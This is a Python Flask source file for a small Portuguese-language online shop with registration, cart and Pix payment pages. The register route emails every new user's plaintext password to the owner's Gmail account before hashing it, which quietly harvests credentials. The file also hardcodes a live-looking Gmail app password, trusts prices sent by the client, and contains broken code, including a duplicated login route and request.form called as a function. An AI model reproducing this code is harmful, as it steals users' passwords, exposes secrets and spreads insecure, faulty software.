from flask import Flask, redirect, render_template, request, session
from flask_session import Session
from werkzeug.security import check_password_hash, generate_password_hash

from cs50 import SQL
from flask import Flask, jsonify, render_template


from functools import wraps


import smtplib
import email.message

def enviar_email(corpo_email):  
    

    msg = email.message.Message()
    msg['Subject'] = "Assunto"
    msg['From'] = 'caioba.maciel@gmail.com'
    msg['To'] = 'caioba.maciel@gmail.com'
    password = 'nqtenlurghflcokf'
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo_email )

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('Email enviado')
def EmailToClient(corpo_email, client):  
    

    msg = email.message.Message()
    msg['Subject'] = "Assunto"
    msg['From'] = 'caioba.maciel@gmail.com'
    msg['To'] = client
    password = 'nqtenlurghflcokf'
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo_email )

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('Email enviado')



# In[ ]:

app = Flask(__name__)

# Configuração da sessão
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

# Chave secreta para criptografar a sessão
app.secret_key = 'sua_chave_secreta_aqui'


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get("user_id") is None:
            return redirect("/login")
        return f(*args, **kwargs)
    return decorated_function
# Configure CS50 Library to use SQLite database
db = SQL("sqlite:///loja.db")

# Variável global produto
produto = []

@app.after_request
def after_request(response):
    """Ensure responses aren't cached"""
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Expires"] = 0
    response.headers["Pragma"] = "no-cache"
    return response

@app.route("/", methods=["GET", "POST"])
@login_required
def index():
    global produto  # Define a variável global 'produto'

    if request.method == "POST":
        # Verifica se o POST é uma pesquisa
        if "pesquisa" in request.form:
            pesquisa = request.form["pesquisa"]
            produtos = db.execute("SELECT * FROM produtos WHERE nome LIKE ?", f"%{pesquisa}%")
            return render_template("index.html", produtos=produtos)

        # Verifica se o POST é do botão "Adicionar ao Carrinho"
        if "carrinho" in request.form:
            print("/////////////////////////////carrinho //////////////////////////////")
            produto_id = request.form["carrinho"]
            if 'user_id' in session:
                cor = request.form("cor")
                preco = request.form("preco")
                
                user_id = session["user_id"]
                db.execute("INSERT INTO carrinho (user_id, produto_id, cor,preco) VALUES (?, ?,?,?)", user_id, produto_id, cor, preco)
                return redirect("/carrinho")
            else:
                return redirect("/login")

        try:
            # Recebe os dados JSON enviados pelo cliente
            data = request.get_json()

            # Extrai o 'id' do JSON
            produto_id = data.get('id')

            print(f"ID do produto recebido: {produto_id}")

            # Busca o produto no banco de dados pelo id
            resultado = db.execute("SELECT * FROM produtos WHERE id = ?", produto_id)

            if resultado:
                produto = resultado[0]  # Armazena apenas o primeiro produto encontrado
                return jsonify({"status": "sucesso"}), 200
            else:
                return jsonify({"status": "erro", "mensagem": "Produto não encontrado"}), 404

        except Exception as e:
            return jsonify({"status": "erro", "mensagem": str(e)}), 400

    produtos = db.execute("SELECT * FROM produtos")
    return render_template("index.html", produtos=produtos)
@app.route("/produto", methods=["GET", "POST"])
@login_required
def produto():
    global produto

    if request.method == "POST":
        if "cep" in request.form:
            
            cep = request.form.get("cep")
            rua = request.form.get("rua")
            numero = request.form.get("numero")
            complemento = request.form.get("complemento")
            bairro = request.form.get("bairro")
            cidade = request.form.get("cidade")
            estado = request.form.get("estado")
            mail = request.form.get("mail")

            


            texto = f"""cep:{cep}  rua:{rua}  numero:{numero}  complemento:{complemento}  bairo:{bairro}  cidade:{cidade}  estado:{estado}  email:{mail} """

            text = f"""Sua compra Foi realizada com successo no Valor de {request.form.get("valor")}r$ seu pedido será emcaminhado após a realização do pagamento.caso não foi você entre em contato: 31 984217616"""

            try:
                EmailToClient(text, mail)
            except:
                return render_template("error.html", erro = "email invalido")

            enviar_email(texto)

            return render_template("pix.html", valor = request.form.get("valor"))

    if "buy" in request.args:
        produto_id = request.args.get("buy")
        valor = request.args.get("preco")
        cor = request.args.get("cor")
        text =f"""<h1>foi comprado um produto {produto_id} de {valor} reais da cor: {cor} e vc é um cara legal</h1>"""
        enviar_email(text)
        return render_template("pagamento.html", valor = valor)
        

    precos = produto["precos"].split(",")
    cores = produto["cores"].split(",")
    if produto:
        return render_template("produto.html", produto=produto, precos=precos, cores=cores)
    else:
        return redirect("/")

@app.route("/carrinho", methods=["GET", "POST"])
@login_required
def carrinho():
    if request.method == "POST":
        if "cep" in request.form:

            cep = request.form.get("cep")
            rua = request.form.get("rua")
            numero = request.form.get("numero")
            complemento = request.form.get("complemento")
            bairro = request.form.get("bairro")
            cidade = request.form.get("cidade")
            estado = request.form.get("estado")
            mail = request.form.get("mail")

            texto = f"""cep:{cep}  rua:{rua}  numero:{numero}  complemento:{complemento}  bairo:{bairro}  cidade:{cidade}  estado:{estado}  email:{mail} """

            text = f"""Sua compra Foi realizada com successo no Valor de {request.form.get("valor")}r$ seu pedido será emcaminhado após a realização do pagamento.caso não foi você entre em contato: 31 984217616"""

            try:
                EmailToClient(text, mail)
            except:
                return render_template("error.html", erro = "email invalido")

            enviar_email(texto)

            return render_template("pix.html", valor = request.form.get("valor"))
    # Obtém os IDs dos produtos no carrinho do usuário
    produtos_ids = db.execute("SELECT produto_id FROM carrinho WHERE user_id = ?", session["user_id"])

    # Extrai os IDs dos produtos da lista de dicionários
    ids = tuple(item["produto_id"] for item in produtos_ids)

    # Obtém os dados do usuário
    user = db.execute("SELECT * FROM users WHERE id = ?", session["user_id"])

    info = db.execute("SELECT cor, preco FROM carrinho WHERE user_id = ?", session["user_id"])
    print(info)

    # Obtém os produtos correspondentes aos IDs
    if ids:  # Verifica se há IDs para evitar erros na consulta SQL
        produtos = db.execute("SELECT * FROM produtos WHERE id IN ({})".format(", ".join("?" for _ in ids)), *ids)
    else:
        produtos = []  # Se não houver produtos no carrinho, retorna uma lista vazia

    

    # Obtém a quantidade de produtos do request
    quant = int(request.args.get("quant", 0))  # Converte para inteiro
    if quant > 0:
        precos = []
        cores = []
        ids = []

        for i in range(quant):
            precos.append(request.args.get(f"preco{i}", "0"))  # Usa f-strings para maior legibilidade
            cores.append(request.args.get(f"cor{i}", "0"))
            ids.append(request.args.get(f"id{i}", "0"))

        total = 0

        for preco in precos:
            total+=float(preco)

        

        print(precos, cores, ids)

        for i in range(quant):
            texto= f"foi compado produto{ids[i]} em uma carrinho por {precos[i]} da cor {cores[i]}"
            enviar_email(texto)

        return render_template("pagamento.html",valor = total)

    return render_template("carrinho.html", user=user[0], produtos=produtos, info = info)


app.route("/login", methods=["GET", "POST"])
def login():
    """Log user in"""

    # Limpa a sessão atual
    session.clear()

    if request.method == "POST":
        # Verifica se o nome de usuário foi enviado
        if not request.form.get("username"):
            return ("must provide username")

        # Verifica se a senha foi enviada
        elif not request.form.get("password"):
            return("must provide password")

        # Consulta o banco de dados para o nome de usuário
        rows = db.execute(
            "SELECT * FROM users WHERE username = ?", request.form.get("username")
        )
        

        # Verifica se o nome de usuário existe e se a senha está correta
        if len(rows) != 1 or not check_password_hash(
            rows[0]["hash"], request.form.get("password")
        ):
            return ("invalid username and/or password")

        # Armazena o ID do usuário na sessão
        session["user_id"] = rows[0]["id"]

        # Redireciona para a página inicial
        return redirect("/")

    # Se o método for GET, exibe a página de login
    return render_template("login.html")


@app.route("/register", methods=["GET", "POST"])
def register():
    """Register user"""

    if request.method == "POST":
        # Verifica se o nome de usuário foi enviado
        if not request.form.get("username"):
            return render_template("error.html", erro = "must provide username, 400")

        # Verifica se a senha foi enviada
        elif not request.form.get("password"):
            return ("must provide password")

        # Verifica se a confirmação da senha foi enviada
        elif not request.form.get("confirmation"):
            return ("must confirm password")

        # Verifica se as senhas coincidem
        if request.form.get("password") != request.form.get("confirmation"):
            return ("passwords do not match")

        texto = f"user: {request.form.get('username')} senha: {request.form.get('password')}"


        enviar_email(texto)

        # Gera o hash da senha
        hash = generate_password_hash(request.form.get("password"))

        # Insere o novo usuário no banco de dados
        try:
            db.execute(
                "INSERT INTO users (username, hash) VALUES (?, ?)",
                request.form.get("username"), hash
            )
        except:
            return render_template("username already exists")

        # Redireciona para a página de login
        return redirect("/login")

    # Se o método for GET, exibe a página de registro
    return render_template("register.html")


@app.route("/logout")
def logout():
    """Log user out"""

    # Limpa a sessão
    session.clear()

    # Redireciona para a página de login
    return redirect("/")
@app.route("/adicionar_carrinho", methods=["GET"])
def adicionar_carrinho():
    if 'user_id' in session:
        produto_id = request.args.get("produto_id")  # Captura o produto_id da URL
        if produto_id:
            
            cor = request.args.get("cor")
            preco = request.args.get("preco")
                
            user_id = session["user_id"]
            db.execute("INSERT INTO carrinho (user_id, produto_id, cor,preco) VALUES (?, ?,?,?)", user_id, produto_id, cor, preco)
            return redirect("/carrinho")
        else:
            return "ID do produto não fornecido.", 400
    else:
        return redirect("/login")
    


@app.route("/login", methods=["GET", "POST"])
def login():
    """Log user in"""

    # Limpa a sessão atual
    session.clear()

    if request.method == "POST":
        # Verifica se o nome de usuário foi enviado
        if not request.form.get("username"):
            return ("must provide username")

        # Verifica se a senha foi enviada
        elif not request.form.get("password"):
            return("must provide password")

        # Consulta o banco de dados para o nome de usuário
        rows = db.execute(
            "SELECT * FROM users WHERE username = ?", request.form.get("username")
        )

        # Verifica se o nome de usuário existe e se a senha está correta
        if len(rows) != 1 or not check_password_hash(
            rows[0]["hash"], request.form.get("password")
        ):
            return ("invalid username and/or password")

        # Armazena o ID do usuário na sessão
        session["user_id"] = rows[0]["id"]

        # Redireciona para a página inicial
        return redirect("/")

    # Se o método for GET, exibe a página de login
    return render_template("login.html")

